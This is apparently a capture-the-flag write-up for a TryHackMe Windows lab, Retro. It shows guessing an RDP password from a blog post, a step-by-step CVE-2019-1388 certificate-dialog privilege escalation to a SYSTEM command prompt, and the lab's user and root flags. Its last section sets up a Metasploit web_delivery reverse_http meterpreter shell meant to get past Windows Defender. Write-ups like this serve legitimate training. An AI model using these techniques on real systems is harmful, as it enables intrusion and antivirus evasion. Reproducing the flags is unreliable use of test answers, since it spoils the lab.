```

## Initial Foothold

- At the webpage `http://10.10.244.151/retro` we find posts written by `Wade` (potential username?)
	- On the webpage, we find a Ready Player One post and find a few hints
		- "I keep mistyping the name of his avatar whenever I log in but I think Iâ€™ll eventually get it down. Either way, Iâ€™m really excited to see this movie! "
		- "Leaving myself a note here just in case I forget how to spell it: parzival"
		- We can infer his login may be `Wade:parzival`

- SUCCESS - we can login as `Wade` with the password `parzival` using RDP

## PrivEsc

- Using CVE-2019-1388, we can elevate privileges using a vulnerability existing in the Windows Certificate Dialog as it does not properly enforce user privileges, aka 'Windows Certificate Dialog Elevation of Privilege Vulnerability'. 
- [Steps](https://github.com/nobodyatall648/CVE-2019-1388):
	1) find a program that can trigger the UAC prompt screen
		1) `hhpud.exe`
	2) select "Show more details"
	3) select "Show information about the publisher's certificate"
	4) click on the "Issued by" URL link it will prompt a browser interface.
	5) wait for the site to be fully loaded & select "save as" to prompt a explorer window for "save as".
	6) on the File Explorer window address path, enter the `cmd.exe` full path:
	`C:\WINDOWS\system32\cmd.exe` then `Enter`
	7) now you'll have an escalated privileges command prompt. 

- User flag - Wade
```
THM{HACK_PLAYER_ONE}
```

- Root flag
```
THM{COIN_OPERATED_EXPLOITATION}
```

## Gain RevShell using Metasploit and bypass AV:

- Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery!
- For this, we'll be using the script web delivery exploit within Metasploit.
	- `use exploit/multi/script/web_delivery`
	- `set target 2`
	- `set lhost tun0`
	- `set lport 443`
	-  `set payload windows/meterpreter/reverse_http`
	- `run -j
- Now, return to the terminal we spawned with our exploit.
	- In this terminal, paste the command output by Metasploit after the job was launched.
	- In this case, I've found it particularly helpful to host a simple python web server (`python3 -m http.server`) and host the command in a text file as copy and paste between the machines won't always work.
	- Once you've run this command, return to our attacker machine and note that our reverse shell has spawned.
